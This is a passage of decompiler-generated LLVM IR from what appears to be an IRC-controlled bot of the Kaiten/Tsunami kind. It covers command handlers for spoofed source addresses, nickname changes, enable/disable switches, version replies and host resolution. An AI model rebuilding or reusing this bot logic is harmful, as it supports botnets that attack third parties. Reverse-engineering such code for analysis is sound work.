  %v3_10001484 = load i8, i8* %v2_10001484, align 1
  store i32 ptrtoint (i32* @global_var_10001498.55 to i32), i32* @lr, align 4
  %v4_10001494 = call i32 @putc_unlocked(i8 %v3_10001484, i32 %v3_10001210, i32 %v2_10001480)
  br label %dec_label_pc_100014bc

dec_label_pc_1000149c:                            ; preds = %dec_label_pc_10001418
  %v2_100014a4 = add i32 %storemerge817, %v2_10001074
  %v1_100014a8 = add i32 %v2_100014a4, 1084
  %v2_100014a8 = inttoptr i32 %v1_100014a8 to i8*
  %v3_100014a8 = load i8, i8* %v2_100014a8, align 1
  store i32 268440764, i32* @lr, align 4
  %v4_100014b8 = call i32 @__GI_fputc(i8 %v3_100014a8, i32 %v3_10001210, i32 %v2_100014a4)
  br label %dec_label_pc_100014bc

dec_label_pc_100014bc:                            ; preds = %dec_label_pc_10001478, %dec_label_pc_10001448, %dec_label_pc_1000149c
  %v1_100014c0 = add nuw nsw i32 %storemerge817, 1
  %v2_100014d0 = icmp slt i32 %v1_100014c0, %v4_100013d4
  br i1 %v2_100014d0, label %dec_label_pc_10001418, label %dec_label_pc_100013c0

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100013c0
  store i32 268440804, i32* @lr, align 4
  %v1_100014e0 = inttoptr i32 %v3_10001210 to i16*
  %v2_100014e0 = call i32 @__GI_fclose(i16* %v1_100014e0)
  store i32 ptrtoint ([3 x i8]* @global_var_100014ec.56 to i32), i32* @lr, align 4
  %v1_100014e8 = call i32 @close(i32 %v3_10000f94)
  %v0_100014f0 = call i32 @__GI_exit()
  br label %dec_label_pc_100014f4

dec_label_pc_100014f4:                            ; preds = %entry, %dec_label_pc_100014dc
  %v0_1000150c = phi i32 [ %v1_10000f4c, %entry ], [ %v0_100014f0, %dec_label_pc_100014dc ]
  %v2_100014f4 = load i32, i32* %stack_var_-5232, align 4
  store i32 %v2_100014f4, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000150c

; uselistorder directives
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100013d4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_10001230, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000121c, { 1, 0, 2 }
  uselistorder i32 %v3_10001210, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge570, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000104c, { 2, 1, 0 }
  uselistorder i32 %v2_10001058.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_100014f4, { 1, 0 }
  uselistorder label %dec_label_pc_100014bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001418, { 1, 0 }
  uselistorder label %dec_label_pc_10001398, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100012b4, { 1, 0 }
  uselistorder label %dec_label_pc_10001274, { 1, 0 }
  uselistorder label %dec_label_pc_100011b0, { 1, 0 }
  uselistorder label %dec_label_pc_10001158, { 1, 0 }
  uselistorder label %dec_label_pc_1000111c, { 1, 0 }
  uselistorder label %dec_label_pc_10001070, { 1, 0 }
  uselistorder label %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000103c, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10000f88, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp36 = call i8 @__decompiler_undefined_function_4()
  %v3_10001550 = load i32, i32* @global_var_10045178.30, align 4
  %v3_10001570 = icmp eq i32 %v3_10001550, 1
  %v3_1000158016 = zext i8 %tmp36 to i32
  br i1 %v3_10001570, label %dec_label_pc_10001578, label %dec_label_pc_100015e8

dec_label_pc_10001578:                            ; preds = %entry
  %v9_100015e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002a2e0.57 to i32), i32 %arg2, i32 %v3_1000158016)
  br label %dec_label_pc_100016b0

dec_label_pc_100015e8:                            ; preds = %entry
  %v9_100016ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1002a300.59 to i32), i32 %arg2, i32 %v3_1000158016)
  br label %dec_label_pc_100016b0

dec_label_pc_100016b0:                            ; preds = %dec_label_pc_10001578, %dec_label_pc_100015e8
  %storemerge = phi i32 [ %v9_100016ac, %dec_label_pc_100015e8 ], [ %v9_100015e0, %dec_label_pc_10001578 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_1000158016, { 1, 0 }
  uselistorder label %dec_label_pc_100016b0, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v6_1000170c = call i32 @Send(i32 %arg1, i32 ptrtoint ([70 x i8]* @global_var_1002a330.60 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  ret i32 %v6_1000170c
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001750 = icmp eq i32 %arg3, 1
  br i1 %v3_10001750, label %dec_label_pc_10001774, label %dec_label_pc_10001758

dec_label_pc_10001758:                            ; preds = %entry
  %v6_1000176c = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1002a378.61 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100017e8

dec_label_pc_10001774:                            ; preds = %entry
  %v1_10001778 = add i32 %arg4, 4
  %v1_1000177c = inttoptr i32 %v1_10001778 to i32*
  %v2_1000177c = load i32, i32* %v1_1000177c, align 4
  store i32 %v2_1000177c, i32* @r3, align 4
  %v0_10001784 = call i32 @__GI_strlen()
  %tmp9 = icmp ult i32 %v0_10001784, 33
  br i1 %tmp9, label %dec_label_pc_100017b0, label %dec_label_pc_10001794

dec_label_pc_10001794:                            ; preds = %dec_label_pc_10001774
  %v6_100017a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002a390.63 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100017e8

dec_label_pc_100017b0:                            ; preds = %dec_label_pc_10001774
  %v2_100017b8 = load i32, i32* %v1_1000177c, align 4
  store i32 %v2_100017b8, i32* @global_var_10045198.65, align 4
  %v2_100017cc = load i32, i32* %v1_1000177c, align 4
  %v6_100017e4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1002a3c8.66 to i32), i32 %v2_100017cc, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100017e8

dec_label_pc_100017e8:                            ; preds = %dec_label_pc_10001794, %dec_label_pc_10001758, %dec_label_pc_100017b0
  %v0_100017fc = phi i32 [ %v6_100017a8, %dec_label_pc_10001794 ], [ %v6_1000176c, %dec_label_pc_10001758 ], [ %v6_100017e4, %dec_label_pc_100017b0 ]
  ret i32 %v0_100017fc

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100017e8, { 2, 0, 1 }
}

define i32 @realrand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001800 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001800, i32* %stack_var_-32, align 4
  store i32 268441640, i32* @lr, align 4
  %v1_10001824 = call i32 @__GI_time(i32 0)
  store i32 268441648, i32* @lr, align 4
  %v0_1000182c = call i32 @__libc_getpid()
  %v2_10001834 = add i32 %v1_10001824, %v0_1000182c
  store i32 268441664, i32* @lr, align 4
  %v1_1000183c = call i32 @srand(i32 %v2_10001834)
  store i32 268441668, i32* @lr, align 4
  %v0_10001840 = call i32 @random()
  %v2_10001850 = sub i32 1, %arg1
  %v1_10001854 = add i32 %v2_10001850, %arg2
  %v2_10001858 = srem i32 %v0_10001840, %v1_10001854
  %v2_10001868 = add i32 %v2_10001858, %arg1
  %v2_10001870 = load i32, i32* %stack_var_-32, align 4
  %v1_1000187c = add i32 %v2_10001870, -12
  %v2_1000187c = inttoptr i32 %v1_1000187c to i32*
  %v3_1000187c = load i32, i32* %v2_1000187c, align 4
  store i32 %v3_1000187c, i32* @r29, align 4
  ret i32 %v2_10001868

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @rndnick(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 268441788, i32* @lr, align 4
  %v2_100018b8 = call i32 @realrand(i32 4, i32 8)
  store i32 268441800, i32* @lr, align 4
  %v1_100018c4 = call i32 @randstring(i32 %v2_100018b8)
  store i32 %v1_100018c4, i32* @global_var_10045198.65, align 4
  %v1_100018d4 = call i32 @getBuild(i32 268697600)
  %v8_10001904 = call i32 @Send(i32 %arg1, i32 ptrtoint ([16 x i8]* @global_var_1002a3d4.67 to i32), i32 ptrtoint ([8 x i8]* @global_var_1002a3e4.68 to i32), i32 %v1_100018d4)
  ret i32 %v8_10001904
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001948 = icmp eq i32 %arg3, 1
  br i1 %v3_10001948, label %dec_label_pc_100019b8, label %dec_label_pc_10001950

dec_label_pc_10001950:                            ; preds = %entry
  %v6_10001964 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1002a3ec.69 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_1000196c = load i8, i8* @global_var_10045170.23, align 1
  %v3_10001974 = icmp eq i8 %v3_1000196c, 0
  %. = select i1 %v3_10001974, i32 ptrtoint ([28 x i8]* @global_var_1002a414.71 to i32), i32 ptrtoint ([9 x i8]* @global_var_1002a408.70 to i32)
  %v7_100019b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_1002a430.72 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001a7c

dec_label_pc_100019b8:                            ; preds = %entry
  %v3_100019bc = load i8, i8* @global_var_10045170.23, align 1
  %v3_100019c4 = icmp eq i8 %v3_100019bc, 0
  br i1 %v3_100019c4, label %dec_label_pc_100019e8, label %dec_label_pc_100019cc

dec_label_pc_100019cc:                            ; preds = %dec_label_pc_100019b8
  %v6_100019e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002a454.74 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001a7c

dec_label_pc_100019e8:                            ; preds = %dec_label_pc_100019b8
  %v1_100019ec = add i32 %arg4, 4
  %v1_100019f0 = inttoptr i32 %v1_100019ec to i32*
  %v2_100019f0 = load i32, i32* %v1_100019f0, align 4
  store i32 %v2_100019f0, i32* @r3, align 4
  %v0_100019f8 = call i32 @__GI_strlen()
  %tmp13 = icmp ult i32 %v0_100019f8, 255
  br i1 %tmp13, label %dec_label_pc_10001a24, label %dec_label_pc_10001a08

dec_label_pc_10001a08:                            ; preds = %dec_label_pc_100019e8
  %v6_10001a1c = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a474.76 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001a7c

dec_label_pc_10001a24:                            ; preds = %dec_label_pc_100019e8
  store i8 1, i8* @global_var_10045170.23, align 1
  store i32 ptrtoint (i32* @global_var_1004db70.78 to i32), i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 256, i32* @r5, align 4
  store i32 268442188, i32* @lr, align 4
  %v0_10001a48 = call i32 @__GI_memset()
  %v2_10001a54 = load i32, i32* %v1_100019f0, align 4
  %v2_10001a64 = inttoptr i32 %v2_10001a54 to i8*
  %v3_10001a64 = call i32 @strcpy(i32 ptrtoint (i32* @global_var_1004db70.78 to i32), i8* %v2_10001a64)
  %v6_10001a78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1002a49c.79 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32 %arg4)
  br label %dec_label_pc_10001a7c

dec_label_pc_10001a7c:                            ; preds = %dec_label_pc_10001a08, %dec_label_pc_100019cc, %dec_label_pc_10001950, %dec_label_pc_10001a24
  %v0_10001a90 = phi i32 [ %v6_10001a1c, %dec_label_pc_10001a08 ], [ %v6_100019e0, %dec_label_pc_100019cc ], [ %v7_100019b0, %dec_label_pc_10001950 ], [ %v6_10001a78, %dec_label_pc_10001a24 ]
  ret i32 %v0_10001a90

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10001a7c, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001abc = icmp eq i32 %arg3, 1
  br i1 %v3_10001abc, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ac4

dec_label_pc_10001ac4:                            ; preds = %entry
  %v6_10001ad8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1002a4bc.80 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_10001ae0 = load i8, i8* @global_var_10045170.23, align 1
  %v3_10001ae8 = icmp eq i8 %v3_10001ae0, 0
  %. = select i1 %v3_10001ae8, i32 ptrtoint ([28 x i8]* @global_var_1002a414.71 to i32), i32 ptrtoint ([9 x i8]* @global_var_1002a408.70 to i32)
  %v7_10001b24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_1002a430.72 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001bc4

dec_label_pc_10001b2c:                            ; preds = %entry
  %v3_10001b30 = load i8, i8* @global_var_10045170.23, align 1
  %v3_10001b38 = icmp eq i8 %v3_10001b30, 0
  br i1 %v3_10001b38, label %dec_label_pc_10001b40, label %dec_label_pc_10001b5c

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b2c
  %v6_10001b54 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002a4d8.82 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001bc4

dec_label_pc_10001b5c:                            ; preds = %dec_label_pc_10001b2c
  %v1_10001b60 = add i32 %arg4, 4
  %v1_10001b64 = inttoptr i32 %v1_10001b60 to i32*
  %v2_10001b64 = load i32, i32* %v1_10001b64, align 4
  store i32 ptrtoint (i32* @global_var_1004db70.78 to i32), i32* @r3, align 4
  store i32 %v2_10001b64, i32* @r4, align 4
  %v2_10001b74 = call i32 @__GI_strcasecmp(i32 ptrtoint (i32* @global_var_1004db70.78 to i32), i32 %v2_10001b64)
  %v3_10001b7c = icmp eq i32 %v2_10001b74, 0
  br i1 %v3_10001b7c, label %dec_label_pc_10001ba0, label %dec_label_pc_10001b84

dec_label_pc_10001b84:                            ; preds = %dec_label_pc_10001b5c
  %v6_10001b98 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1002a4f8.84 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001bc4

dec_label_pc_10001ba0:                            ; preds = %dec_label_pc_10001b5c
  store i8 0, i8* @global_var_10045170.23, align 1
  %v6_10001bc0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002a514.86 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001bc4

dec_label_pc_10001bc4:                            ; preds = %dec_label_pc_10001b84, %dec_label_pc_10001b40, %dec_label_pc_10001ac4, %dec_label_pc_10001ba0
  %v0_10001bd8 = phi i32 [ %v6_10001b98, %dec_label_pc_10001b84 ], [ %v6_10001b54, %dec_label_pc_10001b40 ], [ %v7_10001b24, %dec_label_pc_10001ac4 ], [ %v6_10001bc0, %dec_label_pc_10001ba0 ]
  ret i32 %v0_10001bd8

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1004db70.78 to i32), { 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10001bc4, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001bdc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001bdc, i32* %stack_var_-336, align 4
  %v3_10001c08 = icmp eq i32 %arg3, 1
  br i1 %v3_10001c08, label %dec_label_pc_10001c44, label %dec_label_pc_10001c10

dec_label_pc_10001c10:                            ; preds = %entry
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10001c24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1002a534.87 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i8* null, i8** @global_var_10045174.29, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045178.30, align 4
  br label %dec_label_pc_10001e18

dec_label_pc_10001c44:                            ; preds = %entry
  %v1_10001c48 = add i32 %arg4, 4
  store i32 %v1_10001c48, i32* %r9.global-to-local, align 4
  %v1_10001c4c = inttoptr i32 %v1_10001c48 to i32*
  %v2_10001c4c = load i32, i32* %v1_10001c4c, align 4
  store i32 %v2_10001c4c, i32* @r3, align 4
  %v0_10001c54 = call i32 @__GI_strlen()
  %tmp32 = icmp ult i32 %v0_10001c54, 17
  br i1 %tmp32, label %dec_label_pc_10001c80, label %dec_label_pc_10001c64

dec_label_pc_10001c64:                            ; preds = %dec_label_pc_10001c44
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10001c78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1002a554.88 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001e18

dec_label_pc_10001c80:                            ; preds = %dec_label_pc_10001c44
  store i32 %v1_10001c48, i32* %r9.global-to-local, align 4
  %v2_10001c88 = load i32, i32* %v1_10001c4c, align 4
  store i32 %v2_10001c88, i32* %r9.global-to-local, align 4
  %v2_10001c8c = ptrtoint i32* %stack_var_-316 to i32
  %v2_10001c98 = inttoptr i32 %v2_10001c88 to i8*
  %v3_10001c98 = call i32 @strcpy(i32 %v2_10001c8c, i8* %v2_10001c98)
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001ca4 = call i32 @__GI_strlen()
  %v2_10001cb0 = ptrtoint i32* %stack_var_-328 to i32
  %v1_10001cac = add i32 %v2_10001cb0, -1
  %v2_10001cb4 = add i32 %v1_10001cac, %v0_10001ca4
  store i32 %v2_10001cb4, i32* %r9.global-to-local, align 4
  %v1_10001cb8 = add i32 %v2_10001cb4, 12
  %v2_10001cb8 = inttoptr i32 %v1_10001cb8 to i8*
  %v3_10001cb8 = load i8, i8* %v2_10001cb8, align 1
  %v3_10001cc0 = icmp eq i8 %v3_10001cb8, 46
  br i1 %v3_10001cc0, label %dec_label_pc_10001cc8, label %dec_label_pc_10001d34.preheader

dec_label_pc_10001cc8:                            ; preds = %dec_label_pc_10001c80
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001cd0 = call i32 @__GI_strlen()
  %v2_10001ce0 = add i32 %v1_10001cac, %v0_10001cd0
  store i32 %v2_10001ce0, i32* %r9.global-to-local, align 4
  %v3_10001ce8 = add i32 %v2_10001ce0, 12
  %v4_10001ce8 = inttoptr i32 %v3_10001ce8 to i8*
  store i8 0, i8* %v4_10001ce8, align 1
  br label %dec_label_pc_10001d34.preheader

dec_label_pc_10001d34.preheader:                  ; preds = %dec_label_pc_10001c80, %dec_label_pc_10001cc8
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001d408 = call i32 @__GI_strlen()
  %v2_10001d4810 = icmp eq i32 %v0_10001d408, 0
  br i1 %v2_10001d4810, label %dec_label_pc_10001d50, label %dec_label_pc_10001d00

dec_label_pc_10001d00:                            ; preds = %dec_label_pc_10001d34.preheader, %dec_label_pc_10001d28
  %stack_var_-320.014 = phi i32 [ %v1_10001d2c, %dec_label_pc_10001d28 ], [ 0, %dec_label_pc_10001d34.preheader ]
  %stack_var_-324.113 = phi i32 [ %stack_var_-324.0, %dec_label_pc_10001d28 ], [ 1, %dec_label_pc_10001d34.preheader ]
  %v2_10001d08 = add i32 %stack_var_-320.014, %v2_10001cb0
  store i32 %v2_10001d08, i32* %r9.global-to-local, align 4
  %v1_10001d0c = add i32 %v2_10001d08, 12
  %v2_10001d0c = inttoptr i32 %v1_10001d0c to i8*
  %v3_10001d0c = load i8, i8* %v2_10001d0c, align 1
  %v3_10001d14 = icmp eq i8 %v3_10001d0c, 46
  br i1 %v3_10001d14, label %dec_label_pc_10001d1c, label %dec_label_pc_10001d28

dec_label_pc_10001d1c:                            ; preds = %dec_label_pc_10001d00
  store i32 %stack_var_-324.113, i32* %r9.global-to-local, align 4
  %v1_10001d20 = add i32 %stack_var_-324.113, 1
  br label %dec_label_pc_10001d28

dec_label_pc_10001d28:                            ; preds = %dec_label_pc_10001d00, %dec_label_pc_10001d1c
  %stack_var_-324.0 = phi i32 [ %v1_10001d20, %dec_label_pc_10001d1c ], [ %stack_var_-324.113, %dec_label_pc_10001d00 ]
  store i32 %stack_var_-320.014, i32* %r9.global-to-local, align 4
  %v1_10001d2c = add i32 %stack_var_-320.014, 1
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001d40 = call i32 @__GI_strlen()
  %v2_10001d48 = icmp ult i32 %v1_10001d2c, %v0_10001d40
  br i1 %v2_10001d48, label %dec_label_pc_10001d00, label %dec_label_pc_10001d50

dec_label_pc_10001d50:                            ; preds = %dec_label_pc_10001d34.preheader, %dec_label_pc_10001d28
  %stack_var_-324.1.lcssa = phi i32 [ 1, %dec_label_pc_10001d34.preheader ], [ %stack_var_-324.0, %dec_label_pc_10001d28 ]
  %v1_10001d54 = sub i32 4, %stack_var_-324.1.lcssa
  store i32 %v1_10001d54, i32* %r9.global-to-local, align 4
  %v2_10001db04 = icmp sgt i32 %v1_10001d54, 0
  %v4_10001db06 = icmp eq i32 %v1_10001d54, 0
  br i1 %v2_10001db04, label %dec_label_pc_10001d68, label %dec_label_pc_10001db8

dec_label_pc_10001d68:                            ; preds = %dec_label_pc_10001d50, %dec_label_pc_10001d68
  %storemerge27 = phi i32 [ %v1_10001da0, %dec_label_pc_10001d68 ], [ 0, %dec_label_pc_10001d50 ]
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001d74 = call i32 @__GI_strlen()
  %v2_10001d7c = add i32 %v2_10001c8c, %v0_10001d74
  store i32 %v2_10001d7c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v3_10001d94 = inttoptr i32 %v2_10001d7c to i16*
  store i16 11824, i16* %v3_10001d94, align 2
  %v0_10001d98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001d98 = trunc i32 %v0_10001d98 to i8
  %v2_10001d98 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001d98 = add i32 %v2_10001d98, 2
  %v4_10001d98 = inttoptr i32 %v3_10001d98 to i8*
  store i8 %v1_10001d98, i8* %v4_10001d98, align 1
  %v1_10001da0 = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10001d54, i32* %r9.global-to-local, align 4
  %v2_10001db0 = icmp slt i32 %v1_10001da0, %v1_10001d54
  br i1 %v2_10001db0, label %dec_label_pc_10001d68, label %dec_label_pc_10001db8

dec_label_pc_10001db8:                            ; preds = %dec_label_pc_10001d68, %dec_label_pc_10001d50
  store i32 %v2_10001c8c, i32* %r11.global-to-local, align 4
  %v2_10001dbc = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_10001dbc, i32* %r9.global-to-local, align 4
  %v2_10001dc0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268443088, i32* @lr, align 4
  %v2_10001dcc = bitcast i32* %stack_var_-316 to i8*
  %v3_10001dcc = call i32 @inet_aton(i8* %v2_10001dcc, i32 %v2_10001dc0)
  %v3_10001dd0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10001dd0, i32* %stack_var_-328, align 4
  br i1 %v4_10001db06, label %dec_label_pc_10001de4, label %dec_label_pc_10001df4

dec_label_pc_10001de4:                            ; preds = %dec_label_pc_10001db8
  store i32 268697600, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001e0c

dec_label_pc_10001df4:                            ; preds = %dec_label_pc_10001db8
  %v2_10001dfc = call i32 @poww(i32 256, i32 %v1_10001d54)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10001e10.pre = load i32, i32* %stack_var_-328, align 4
  br label %dec_label_pc_10001e0c

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001de4, %dec_label_pc_10001df4
  %v0_10001e3017 = phi i32 [ %v3_10001dcc, %dec_label_pc_10001de4 ], [ %v2_10001dfc, %dec_label_pc_10001df4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10001de4 ], [ %v2_10001dfc, %dec_label_pc_10001df4 ]
  %v3_10001e10 = phi i32 [ %v3_10001dd0, %dec_label_pc_10001de4 ], [ %v3_10001e10.pre, %dec_label_pc_10001df4 ]
  store i32 %storemerge, i32* @global_var_10045178.30, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v4_10001e14 = inttoptr i32 %v3_10001e10 to i8*
  store i8* %v4_10001e14, i8** @global_var_10045174.29, align 4
  br label %dec_label_pc_10001e18

dec_label_pc_10001e18:                            ; preds = %dec_label_pc_10001c10, %dec_label_pc_10001c64, %dec_label_pc_10001e0c
  %v0_10001e30 = phi i32 [ %v6_10001c24, %dec_label_pc_10001c10 ], [ %v6_10001c78, %dec_label_pc_10001c64 ], [ %v0_10001e3017, %dec_label_pc_10001e0c ]
  %v2_10001e18 = load i32, i32* %stack_var_-336, align 4
  store i32 %v2_10001e18, i32* %r11.global-to-local, align 4
  ret i32 %v0_10001e30

; uselistorder directives
  uselistorder i32 %v2_10001dfc, { 1, 0 }
  uselistorder i32 %v1_10001da0, { 1, 0 }
  uselistorder i32 %v1_10001d54, { 3, 5, 4, 0, 1, 2 }
  uselistorder i32 %stack_var_-324.113, { 2, 0, 1 }
  uselistorder i32 %stack_var_-320.014, { 1, 2, 0 }
  uselistorder i32 %v2_10001c8c, { 3, 0, 2, 4, 1, 5, 6, 7 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 4, 5, 8, 6, 7, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001e18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d68, { 1, 0 }
  uselistorder label %dec_label_pc_10001d50, { 1, 0 }
  uselistorder label %dec_label_pc_10001d28, { 1, 0 }
  uselistorder label %dec_label_pc_10001d00, { 1, 0 }
  uselistorder label %dec_label_pc_10001d34.preheader, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268443224, i32* @lr, align 4
  %v1_10001e54 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_10001e54, i32* @global_var_10045180.92, align 4
  %v4_10001e70 = icmp eq i32 %v1_10001e54, -1
  br i1 %v4_10001e70, label %dec_label_pc_10001e78, label %dec_label_pc_10001eec

dec_label_pc_10001e78:                            ; preds = %entry
  store i32 268443264, i32* @lr, align 4
  %v1_10001e7c = call i32 @__GI_gethostbyname(i32 %arg2)
  %v3_10001e8c = icmp eq i32 %v1_10001e7c, 0
  br i1 %v3_10001e8c, label %dec_label_pc_10001e94, label %dec_label_pc_10001ec0

dec_label_pc_10001e94:                            ; preds = %dec_label_pc_10001e78
  %v3_10001e98 = load i32, i32* @global_var_1004519c.24, align 4
  %v6_10001eb4 = call i32 @Send(i32 %v3_10001e98, i32 ptrtoint ([33 x i8]* @global_var_1002a5a4.93 to i32), i32 %arg1, i32 %arg2)
  %v0_10001ebc = call i32 @__GI_exit()
